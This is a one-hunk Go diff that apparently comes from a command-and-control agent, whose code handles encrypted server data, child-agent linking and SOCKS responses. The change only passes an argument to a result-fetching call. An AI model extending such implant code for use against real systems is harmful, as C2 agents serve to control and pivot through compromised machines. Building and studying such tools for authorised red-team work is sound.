@@ -316,7 +316,7 @@ func handleServerData(conn *StreamConn, encryptedPayload string) {
 
 	// Send results back (including any link data from child agents)
 	if hasResults || hasLinkData || hasLinkHandshake || hasUnlinkNotifications || hasSocksResponses {
-		results := resultManager.getPendingResults()
+		results := resultManager.getPendingResults(0)
 
 		payload := map[string]interface{}{
 			secVal(protoKeyAgentId): clientID,
